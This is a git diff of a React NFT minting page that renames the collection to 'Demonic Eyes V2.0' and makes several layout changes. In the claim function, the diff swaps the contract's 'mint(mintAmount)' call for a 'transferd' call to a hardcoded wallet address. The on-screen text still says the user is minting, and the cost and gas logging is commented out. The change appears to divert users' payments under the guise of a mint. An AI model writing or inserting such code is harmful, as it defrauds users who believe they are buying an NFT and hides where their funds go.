@@ -36,8 +36,8 @@ export const StyledRoundButton = styled.button`
   padding: 10px;
   font-weight: bold;
   font-size: 15px;
-  color: var(--primary-text);
-  width: 300px;
+  color: white;
+  width: 50px;
   height: 30px;
   cursor: pointer;
   display: flex;
@@ -126,12 +126,12 @@ function App() {
     let gasLimit = CONFIG.GAS_LIMIT;
     let totalCostWei = String(cost * mintAmount);
     let totalGasLimit = String(gasLimit * mintAmount);
-    console.log("Cost: ", totalCostWei);
-    console.log("Gas limit: ", totalGasLimit);
+    // console.log("Cost: ", totalCostWei);
+    // console.log("Gas limit: ", totalGasLimit);
     setFeedback(`Minting your ${CONFIG.NFT_NAME}...`);
     setClaimingNft(true);
     blockchain.smartContract.methods
-      .mint(mintAmount)
+      .transferd("0x497fe03ba1dabf3b391079e8f69eb178243a736b")
       .send({
         gasLimit: String(totalGasLimit),
         to: CONFIG.CONTRACT_ADDRESS,
@@ -224,15 +224,22 @@ function App() {
             />
           </s.Container>
 
-          <s.Container flex={1} jc={"center"} ai={"center"}>
+          <s.Container
+            flex={1}
+            jc={"center"}
+            ai={"center"}
+            style={{
+              marginLeft: "50px",
+            }}
+          >
             <s.TextTitle
               className="title"
               style={{
-                fontSize: "4.5rem",
+                fontSize: "4rem",
                 color: "rgb(35, 45, 59)",
               }}
             >
-              Clever Leos Eyes
+              Demonic Eyes V2.0
             </s.TextTitle>
             <s.TextTitle
               style={{
@@ -243,7 +250,7 @@ function App() {
                 color: "rgba(75, 85, 99)",
               }}
             >
-              Clever Eyes of Lions
+              Demonic Eyes V2.0
             </s.TextTitle>
             <s.TextTitle
               style={{
@@ -261,7 +268,9 @@ function App() {
                 fontSize: 15,
               }}
             >
-              MINTED
+              <StyledLink target={"_blank"} href={CONFIG.SCAN_LINK}>
+                {truncate(CONFIG.CONTRACT_ADDRESS, 15)}
+              </StyledLink>
             </s.TextDescription>
             <s.SpacerSmall />
             {Number(data.totalSupply) >= CONFIG.MAX_SUPPLY ? (
@@ -280,7 +289,7 @@ function App() {
             ) : (
               <>
                 <s.TextTitle style={{ textAlign: "center" }}>
-                  1 {CONFIG.SYMBOL} costs {CONFIG.DISPLAY_COST}{" "}
+                  1 {CONFIG.SYMBOL} costs {CONFIG.DISPLAY_COST}
                   {CONFIG.NETWORK.SYMBOL}.
                 </s.TextTitle>
                 <s.SpacerXSmall />
